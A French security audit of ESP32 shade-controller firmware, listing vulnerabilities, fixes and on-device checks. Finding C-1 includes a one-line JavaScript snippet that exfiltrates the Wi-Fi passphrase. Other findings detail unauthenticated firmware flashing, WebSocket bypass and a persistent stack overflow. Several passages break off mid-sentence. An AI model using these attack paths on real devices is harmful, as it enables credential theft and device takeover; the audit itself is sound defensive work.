`shadeSize`. **Volets, pièces et groupes étaient donc perdus au premier redémarrage suivant
l'installation** — pour tout utilisateur, sans exception et sans avertissement.

**Correctif.** Quand le tampon est plein, drainer jusqu'au séparateur inclus avant de rendre la
main. L'alignement du flux est rétabli **et** la protection voulue par M-11 est conservée : un
champ malformé plus long que le tampon est sauté jusqu'à son séparateur au lieu de déborder.

**Vérifié sur appareil** après flash : en-tête relu
`version:26 len:76 roomSize:29 shadeSize:316 shadeRecs:1 groupSize:206 pos:76` — toutes les
constantes à leur place, flux aligné. Puis persistance complète au redémarrage d'un jeu
1 pièce / 3 volets / 1 groupe avec ses liens, `lastRollingCode` et `flags` compris.

**Ce que ce constat dit de la méthode.** M-11 était marqué « corrigé » et « **non éprouvé sur
appareil** ». Le défaut qu'il visait était réel, le correctif plausible, la relecture n'a rien vu —
et le commentaire qui l'accompagnait affirmait l'exact contraire de ce que faisait le code, avec
assurance. Seul un redémarrage réel pouvait le révéler. **Un correctif non éprouvé sur matériel
n'est pas un correctif, c'est une hypothèse** — et celui-ci était plus grave que le défaut qu'il
réparait.

### Points à valider avant diffusion

   découverte (`SomfySerialize.cpp:272` et `:276`) : nous avons authentifié l'endpoint sans retirer
   les secrets, donc rompu le contrat des clients tiers *et* gardé la donnée sensible dans la
   réponse. La piste privilégiée est de scinder `/discovery` en deux moitiés sur le modèle déjà
   retenu pour `/loginContext` (M-17). L'intégration n'est **pas** à modifier dans l'immédiat :
   elle est en ligne, largement déployée et alignée sur des firmwares v2.5.x.
2. **Test matériel de l'OTA** de bout en bout (`/getReleases` puis installation) : c'est le seul
   chemin où le pinning peut se révéler faux en conditions réelles.
3. **Rotation des autorités** : si GitHub change d'émetteur, l'OTA automatique s'arrête. Le
   téléversement manuel par `/updateFirmware` et le flash USB restent disponibles.
4. **M-16 / M-17, à éprouver sur appareil PIN activé** (logique vérifiée hors cible seulement) :
   - trois PIN faux depuis une machine, puis un quatrième → 429 avec `retryAfter: 15` ; recommencer
     → 30, puis 60. Depuis une **seconde machine**, la connexion doit rester possible **pendant**
     ce verrouillage : c'est tout l'objet de M-16, et c'est le seul contrôle qui compte ;
   - le bon PIN après expiration du verrou doit remettre le compteur à zéro ;
   - `curl http://<boitier>/loginContext` sans clé → 8 champs, ni MAC ni version ni uptime ; avec
     `-H "apikey: <jeton>"` → réponse complète ;
   - se connecter dans l'interface, puis vérifier que l'en-tête affiche bien MAC, CPU, flash et
     uptime (c'est la relecture post-connexion qui les fournit désormais) ;
   - basculer en « config seule » : le tableau de bord public doit retrouver son en-tête complet
     sans aucune connexion.
5. **Lot E-16 → E-19, à valider PIN activé** (aucun de ces chemins n'est exercé sécurité
   désactivée) :
   - relever `Max Heap` / `largest` (évènement socket `memStatus`) **avant** puis **après** une
     dizaine de rechargements de page et deux installations de langue. Attendu : un plancher
     stable, plus une pente. Toute reprise du plateau à 38 900 signifie qu'un autre consommateur
     reste à trouver ;
   - téléchargement d'une langue depuis GitHub jusqu'à 100 %, barre de progression comprise ;
   - téléversement manuel d'un `.json.gz` de langue (`/uploadLang`), puis rechargement de page
     **immédiat** — c'est ce rechargement qui déclenchait le `onDisconnect` périmé de E-18 ;
   - après chacune de ces opérations, vérifier qu'**aucune ressaisie du PIN** n'est demandée et que
     la WebSocket se rouvre seule (l'état des volets doit revenir sans intervention) ;
   - fermer puis rouvrir l'onglet : le PIN **doit** être redemandé (limite volontaire de
     `sessionStorage`) ;
   - enfin, `/getReleases` puis une OTA complète **avec le PIN actif** : c'est la combinaison qui
     échouait, et elle passe par les trois vérificateurs corrigés (HTTP, WebSocket, port 8082).

### C-1 — CORS totalement ouvert sur l'environnement de build par défaut
**Fichiers :** `platformio.ini:108` (`[env:esp32dev]`), `platformio.ini:91` (`[env:box_wifi]`) — `src/web/Web.cpp:344-348`

`default_envs = esp32dev`, et cet environnement pose `-D ENABLE_DEV_CORS`. Le firmware livré par
défaut émet donc sur **toutes** les réponses :

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

Le commentaire juste au-dessus du bloc dit exactement le contraire de ce que fait le build :
> « CORS n'est nécessaire que pour développer data-dev/ depuis un serveur/origine distincte du
> device […] En usage normal […] exposer inutilement l'API à d'autres sites. »

**Conséquence.** Sécurité à `None` (défaut d'usine), n'importe quel site web visité par
l'utilisateur peut lire et écrire l'intégralité de l'API du boîtier depuis son navigateur, sur son
réseau local. Combiné à C-2, cela donne le **vol du mot de passe Wi-Fi du domicile depuis une page
web quelconque** :

```js
fetch('http://192.168.1.42/scanaps').then(r=>r.json()).then(d=>exfil(d.connected.passphrase));
```

`box_wifi` — l'environnement des boîtiers vendus assemblés (cf. README) — est également concerné.

**Correctif.** Retirer `-D ENABLE_DEV_CORS` de `[env:esp32dev]` et `[env:box_wifi]`. Créer un
`[env:esp32dev_cors]` dédié au développement si nécessaire, et faire échouer le build de release
si le flag est présent (garde-fou dans `check_partition_layout.py` ou un nouveau pre-script).

### C-3 — `/updateFirmware` et `/updateApplication` : écriture de partition sans authentification
**Fichiers :** `src/web/WebSystem.cpp:720-771` (firmware), `src/web/WebSystem.cpp:840-900` (filesystem)

Sous ESPAsyncWebServer, le callback d'upload s'exécute **pendant** l'analyse de la requête, donc
**avant** le handler `onRequest` et son `isAuthenticated()`. Le code le sait parfaitement : c'est
écrit noir sur blanc dans `handleRestoreBody` (`WebSystem.cpp:625-631`) et dans
`handleUploadLangBody` (`WebI18n.cpp:403-410`), qui posent tous deux un
`state->rejected = git.lockFS || !webServer.checkAuth(request, true);` avant d'écrire quoi que ce
soit.

**Ce garde-fou n'a pas été reporté sur les deux routes qui écrivent une partition flash.**
`handleUpdateFirmwareBody` appelle directement, sans aucun contrôle :

```cpp
if (index == 0) {
  Update.begin(UPDATE_SIZE_UNKNOWN);
  somfy.transceiver.end();     // radio coupée
  mqtt.end();                  // MQTT coupé
}
Update.write(data, len);
if (final) { ... Update.end(true); }   // <-- rend la partition OTA amorçable
```

**Conséquence.** Avec la sécurité PIN/mot de passe **activée**, un POST multipart non authentifié
sur `/updateFirmware` :
1. coupe la radio et MQTT (déni de service immédiat) ;
2. écrit l'intégralité de l'image dans la partition OTA inactive ;
3. `Update.end(true)` appelle `esp_ota_set_boot_partition()` → **le prochain redémarrage démarre le
   firmware de l'attaquant**.

Le contrôle `FW_IMAGE_MARKER` n'est pas une protection : c'est une chaîne littérale
(`"ESPSomfyRTS-PART/1/"`) qu'il suffit d'inclure dans l'image. `handleUpdateFirmware()` renverra
bien un 401, mais après coup — le mal est fait. Idem pour `/updateApplication`, qui écrase la
partition LittleFS (sans secours A/B, cf. le commentaire ligne 664).

**Correctif.** Reproduire à l'identique le patron déjà en place dans `handleRestoreBody` :
```cpp
if (index == 0) {
  FwImageScan *scan = (FwImageScan *)malloc(sizeof(FwImageScan));
  if(!scan) return;
  *scan = FwImageScan();
  scan->rejected = git.lockFS || !webServer.checkAuth(request, true);
  request->_tempObject = scan;
  if(scan->rejected) return;      // AVANT Update.begin() / transceiver.end()
  ...
}
FwImageScan *scan = (FwImageScan *)request->_tempObject;
if(!scan || scan->rejected) return;
```

### C-4 — OTA GitHub sans vérification TLS ni signature d'image
**Fichiers :** `src/GitOTA.cpp:318-319`, `692-693`, `917-918`

```cpp

sclient.setInsecure();          // aucune validation de certificat
```

Aucun des trois chemins réseau (liste des releases, test de connectivité, téléchargement du
firmware) ne valide le certificat de `api.github.com` / `github.com`. Il n'existe par ailleurs
**aucune vérification de signature ni de hash** sur l'image téléchargée : `downloadFile()` compare
un nombre d'octets, rien de plus.

**Conséquence.** Quiconque contrôle la résolution DNS ou le chemin réseau (routeur compromis, DNS

1. Épingler le certificat racine de GitHub (`sclient.setCACert(GITHUB_ROOT_CA)`). Coût : ~1,5 Ko de

2. Publier un `.sha256` (ou une signature Ed25519) à côté de chaque asset dans `build.yaml`, le
   télécharger avant l'image, et refuser `Update.end()` si le condensat ne correspond pas. C'est la
   seule protection qui survit à une compromission de la chaîne TLS.

### C-5 — `/discovery` : dump complet de la configuration, sans aucune authentification
**Fichiers :** `src/web/WebSystem.cpp:347-386`, route déclarée `src/web/Web.cpp:351`

`handleDiscovery()` est le **seul** handler de `WebSystem` qui n'appelle jamais

pour l'énumération — il repasse ensuite par `/shades` authentifié).

### C-6 — WebSocket 8080 : aucune authentification
**Fichier :** `src/Sockets.cpp` — `SocketEmitter::wsEvent`, `WStype_CONNECTED` (lignes 251-263 du bloc affiché)

```cpp

    resetSockWriteFailures(num);
    sockServer.sendTXT(num, "Connected");
    sockEmit.delayInit(num);        // -> initClients() -> somfy.emitState(num)
    break;
```

Aucune vérification de jeton, à aucun moment de la vie de la connexion. `initClients()`
(`Sockets.cpp:192-208`) diffuse immédiatement `somfy.emitState(num)`, soit l'état complet de chaque
volet — `shadeId`, `name`, `remoteAddress`, position, cibles (`src/somfy/Somfy.cpp:562-587`).

Pire : n'importe quel client peut envoyer `join:0` (`WStype_TEXT`, ligne 265) pour rejoindre

`address`/`rcode`/`pulses` (`src/somfy/SomfyRadioDriver.cpp:425-448`).

Le modèle d'authentification HTTP est donc entièrement contournable par le canal WebSocket, y
compris quand la sécurité « complète » est activée.

**Correctif.** Exiger le jeton dès la connexion, avant `delayInit()` : soit dans l'URL du handshake
(`sockServer.remoteIP(num)` + un `?apikey=` relu depuis `payload` sur `WStype_CONNECTED`), soit via
un premier message `auth:<token>` obligatoire, avec fermeture après un délai si absent. Réutiliser
`webServer.createAPIToken(ip, token)` — le jeton est déjà déterministe par IP, donc calculable côté
serveur sans état de session.

### E-1 — `transceiver_config_t::fromJSON()` ne valide rien ; `frequency` déborde `_numbuff[25]`
**Fichiers :** `src/somfy/SomfyRadioDriver.cpp:549-591`, `src/web/WebRadioCommands.cpp:730-751`, `src/web/WResp.cpp:384`, `src/web/WResp.h:29`

`/saveRadio` applique le JSON tel quel puis persiste en NVS et l'écrit dans le CC1101 :
```cpp
somfy.transceiver.fromJSON(obj);
somfy.transceiver.save();   // -> NVS + apply()
```
`fromJSON` recopie sans aucune borne `frequency`, `deviation`, `rxBandwidth` (floats),
`type`, `txPower`, et **les six numéros de GPIO**.

Trois défauts distincts en découlent :

**(a) Débordement de pile à la sérialisation.** `JsonFormatter::addElem(const char*, float)` fait
`sprintf(this->_numbuff, "%.4f", fval)` dans un `char _numbuff[25]`. Un `frequency: 1e30` produit
36 caractères → **débordement de 11 octets** d'un membre situé sur la pile de l'appelant. Comme la
valeur est persistée en NVS, le boîtier **plante à chaque appel ultérieur** de `/getRadio`,
`/controller` ou `/discovery` : brique logicielle permanente en une requête.
`NaN`/`inf` produisent en outre `"nan"` → JSON invalide (le problème est déjà documenté pour
`geoLat` dans `ConfigSettings.h:294`, mais la leçon n'a pas été appliquée à `frequency`).

**(b) GPIO arbitraires.** `apply()` appelle `setSpiPin(SCK, MISO, MOSI, CSN)` et `setGDO()` sans
contrôle. Des broches 6-11 (flash SPI interne) plantent l'appareil ; des broches ≥ 34 (input-only)
échouent silencieusement. `sendFrame()` fait par ailleurs `uint32_t pin = 1 << config.TXPin`
(`SomfyRadioDriver.cpp:136`) — comportement indéfini pour `TXPin >= 32`, et `GPIO_OUT_W1TS_REG` ne
couvre de toute façon que les broches 0-31.

**(c) Réglementaire.** `setMHZ(frequency)` sans borne permet d'émettre hors bande ISM 433.

**Correctif.**
```cpp
static inline float clampf(float v, float lo, float hi, float def) {
  return (isnan(v) || v < lo || v > hi) ? def : v;
}
if(obj.containsKey("frequency"))   this->frequency   = clampf(obj["frequency"],  300.f, 928.f, 433.42f);
if(obj.containsKey("deviation"))   this->deviation   = clampf(obj["deviation"],  1.58f, 380.85f, 47.60f);
if(obj.containsKey("rxBandwidth")) this->rxBandwidth = clampf(obj["rxBandwidth"],58.03f,812.50f, 99.97f);
if(obj.containsKey("type"))        { uint8_t t = obj["type"]; if(t == 56 || t == 80) this->type = t; }
```
Et une fonction `isUsableOutputPin(uint8_t)` partagée (0-5, 12-19, 21-23, 25-27, 32-33 sur ESP32)
appliquée aux six broches, ici comme dans `SomfyShade::fromJSON` (cf. M-3).
Indépendamment : borner `addElem(float)` avec `snprintf(_numbuff, sizeof(_numbuff), "%.4f", fval)`
et remplacer les `sprintf` de `WResp.cpp:370-388` par des `snprintf`.

### M-12 — Aucun échappement des caractères de contrôle dans le JSON sortant

### M-22 — Réponses HTTP multiples sur la même requête
**Fichiers :** `src/web/WebRadioCommands.cpp:43, 55, 200, 248, 258, 419, 424` — `src/web/WebShadesRest.cpp:895, 928, 964, 997`

```cpp
if (obj.containsKey("shadeId")) shadeId = obj["shadeId"];
else request->send(500, ...);      // pas de return
...                                 // le code continue et renvoie une seconde réponse
```

`AsyncWebServerRequest::send()` remplace la réponse déjà posée alors que la première est
potentiellement déjà en cours d'émission sur `async_tcp` — fuite de l'objet réponse au mieux,
corruption du flux au pire.

**Correctif.** Ajouter `return;` après chacun de ces `send()`.

**Correctif appliqué — 24/08/2026.** `return;` ajouté après **51** `else request->send(...)` dans
`WebRadioCommands.cpp` (11), `WebShadesRest.cpp` (39) et `WebSystem.cpp` (1).

**Méthode, et son échec initial.** Un premier détecteur automatique n'a trouvé que 5 sites : il
concluait « terminal, donc sans danger » dès que la ligne suivante était une accolade fermante. Or
c'est faux — après les accolades, l'exécution **reprend dans le bloc englobant** et atteint un
second `send()`. Vérifié sur `handleDeleteRoom`, que ce détecteur avait déclaré sain et qui posait
bel et bien deux réponses. Le constat de l'audit était plus juste que mon heuristique.

La correction a donc été appliquée à la classe entière plutôt que site par site : les 51 lignes
concernées sont **toutes** des chemins d'erreur (404, ou 500 « No X supplied » / « X Id not
found »), vérifié par extraction des messages. Aucune n'est un envoi de succès délibérément suivi
de travail — ceux-là (`/restore`, `/reboot`, `/setgeneral`) ne sont pas de la forme
`else request->send(`, et sont restés intacts.

`AsyncWebServerRequest::send()` supprime la réponse déjà posée (`WebRequest.cpp:793`) : le client
recevait donc systématiquement le **dernier** message, jamais le vrai motif. **Non éprouvé sur
appareil.**

### M-23 — Handlers sans réponse en cas de méthode inattendue
**Fichiers :** `src/web/WebRadioCommands.cpp:490, 572, 609, 646, 686, 728` — `src/web/WebShadesRest.cpp:646, 688, 724, 778, 826, 873`

```cpp
if (method == AsyncHttp::PUT || method == AsyncHttp::POST) { ... }
```

Le client attend l'expiration de son délai, et la connexion `async_tcp` reste occupée jusque-là. Le

### M-24 — Verrou de planification tenu pendant l'émission RF
**Fichier :** `src/Schedule.cpp:357-358` (`checkSchedules()` prend `lock()`) → `executeRule()` → `sendCommand()`

`checkSchedules()` verrouille, puis appelle `executeRule()` qui déclenche une salve RF
(`somfy.sendFrame`, plusieurs centaines de ms à plusieurs secondes selon `repeats`). Pendant tout ce
temps, `handleSaveSchedule` / `handleGetSchedules` / `/controller` (phase `CTL_SCHEDULES`) sur
`async_tcp` sont bloqués sur `schedule.lock()`.

**Correctif.** Collecter sous verrou la liste des règles à déclencher (copie des champs nécessaires),
relâcher, puis exécuter hors verrou.

**Correctif appliqué — 24/08/2026.** `checkSchedules()` n'ÉLIT plus que les règles à déclencher,
puis relâche le verrou **avant** toute émission. Ce qui doit rester sous verrou y reste :
`lastTriggeredMinuteKey` (la garantie « un seul déclenchement par minute ») et la planification des
renvois — qui **écrit dans la règle**, ce que le constat ne mentionnait pas et qu'une simple copie
aurait perdu.

Aucun pointeur de règle ne survit au verrou : `/deleteSchedule` pourrait la libérer entre-temps.
D'où `pending_action_t`, qui recopie les seuls champs dont l'émission a besoin. Les cibles sont
**re-résolues par identifiant** hors verrou, `/deleteShade` pouvant lui aussi passer entre les deux ;
une cible disparue dans l'intervalle est ignorée.

`executeRule(ScheduleRule*)` est supprimée : elle n'avait plus d'appelant, et laisser deux chemins
d'émission divergents dans le fichier était le meilleur moyen d'en voir un seul corrigé la
prochaine fois. **Non éprouvé sur appareil** — à couvrir par une règle programmée à la minute
suivante, en sollicitant l'interface pendant le déclenchement.

## Performance & dette technique

### P-1 — Dette de conception : trois serveurs HTTP + un serveur WebSocket
`server` (80, async), `apiServer` (8081, async), `gitSyncServer` (8082, **synchrone**),
`sockServer` (8080). Quatre piles réseau concurrentes sur 320 Ko de RAM, chacune avec son propre
modèle d'authentification — dont deux sont défaillants (C-6, E-9). Le port 8081 duplique 17 routes
déjà servies par le port 80 (`Web.cpp:351-371`), à l'authentification près (`/discovery` sans auth).

**Piste.** Fusionner `apiServer` dans `server` sous un préfixe `/api/`, et remplacer `gitSyncServer`
par une tâche FreeRTOS dédiée pilotée par un drapeau (le modèle différé `releasesRequested` existe
déjà et fonctionne pour `/getAvailableLangs`). Gain estimé : la pile de 12 Ko du `WebServer`
synchrone, plus ses tampons.

### P-2 — Sérialisation JSON en triple exemplaire
Trois représentations coexistent pour chaque entité : `toJSON(JsonObject&)` (ArduinoJson),
`toJSON(JsonFormatter&)` (maison) et `toJSON(JsonSockEvent*)`. Dans `SomfySerialize.cpp`,
`ConfigSettings.cpp` et `SomfyRadioDriver.cpp`, **plus de 260 lignes** de variantes ArduinoJson sont
déjà commentées ; les variantes vivantes `toJSON(JsonObject&)` de `ConfigSettings`, `MQTTSettings`,
`EthernetSettings`, `IPSettings`, `NTPSettings`, `WifiSettings`, `SecuritySettings` et `appver_t`
n'ont plus aucun appelant (`ConfigSettings::toJSON(DynamicJsonDocument&)`, seul consommateur
restant, est lui-même mort).

**Gain estimé : 3 à 5 Ko de flash** en supprimant les surcharges `JsonObject&` inutilisées et les
blocs commentés.

ensemble, puis la compilation a servi d'oracle. Deux candidats ont ainsi été rendus à leur statut de

**Correctif appliqué — 24/08/2026.** Retirés : `ConfigSettings::emitSockets()` (sans argument),

- `ConfigSettings::emitSockets(uint8_t)` — **appelée** depuis `Sockets.cpp:406`. Le rapport traitait
  les deux surcharges comme mortes ; seule celle sans argument l'était.

  viennent d'être validées sur matériel après M-2.
- `WebSystem::findRelease()` / `WebGitSync::findRelease()` — duplication assumée de 10 lignes entre
  deux modules qui n'ont aucune raison de dépendre l'un de l'autre.
- les 50 lignes commentées de `SomfyRadioDriver.h` — ce **n'est pas du code mort** mais la
  documentation des registres du CC1101 : les paramètres que la puce expose et que ce firmware
  choisit de ne pas rendre configurables. Elle vit utilement à côté des champs qui, eux, sont
  utilisés.

**Le gain estimé « 8 à 12 Ko de flash » est faux, et l'écart est instructif.** Mesure réelle sur
`esp32dev` : **1 458 701 → 1 458 621 octets, soit 80 octets**. La chaîne de compilation utilise
`-ffunction-sections -fdata-sections` avec `--gc-sections` au lien : **le linker écartait déjà les
fonctions non référencées**. Et du code commenté ne coûte rien, n'étant jamais compilé. L'estimation
supposait qu'un binaire embarque son code mort, ce qui n'est pas le cas ici.

La valeur de ces deux lots est donc **de lisibilité, pas de place** : plus de triple représentation
JSON à maintenir en parallèle, plus de fonctions vides appelées à chaque tour de boucle, et 233
lignes de code commenté qui faisaient apparaître dans `grep` des définitions qui n'existaient pas.
